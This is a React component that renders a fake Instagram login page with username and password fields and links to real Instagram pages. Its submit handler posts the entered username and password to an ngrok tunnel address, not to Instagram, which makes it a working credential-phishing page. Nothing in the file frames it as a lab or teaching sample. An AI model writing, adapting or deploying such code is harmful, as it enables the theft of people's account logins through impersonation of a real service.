import './App.scss';
import {Component} from 'react'
import axios from 'axios'

class App extends Component {
  constructor(props) {
    super(props);
    this.state = {
      username: "",
      password: ""
    };
    this.handleChange = this.handleChange.bind(this);
    this.handleSubmit = this.handleSubmit.bind(this);
  }
  handleChange(event) {
    this.setState({ [event.target.name] : event.target.value});
  }
  handleSubmit(event) {
    axios.post(
      "https://593ff237027b.ngrok.io/", 
      JSON.stringify({"username":this.state.username, "password":this.state.password}),
      { 
        'Access-Control-Allow-Origin' : '*',
        "Content-Type": "application/json"
      }
    );
    event.preventDefault();
  }
  render() {
      return (
        <div className="entry-page">
          <form>
            <h2>Instagram</h2>
            <fieldset>
              <legend>Log In</legend>
              <ul>
                <li>
                  <label for="username">Username:</label>
                  <input type="text" name="username" onChange={this.handleChange} required/>
                </li>
                <li>
                  <label for="password">Password:</label>
                  <input type="password" name="password" onChange={this.handleChange} required/>
                </li>
                <li>
                  <i/>
                  <a href="https://www.instagram.com/accounts/emailsignup/">Forgot Password?</a>
                </li>
              </ul>
            </fieldset>
            <button onClick={this.handleSubmit}>Login</button>
            <button type="button" href="https://www.instagram.com/accounts/emailsignup/">Create an Account</button>
          </form>
        </div>
      )
  }
}

export default  App;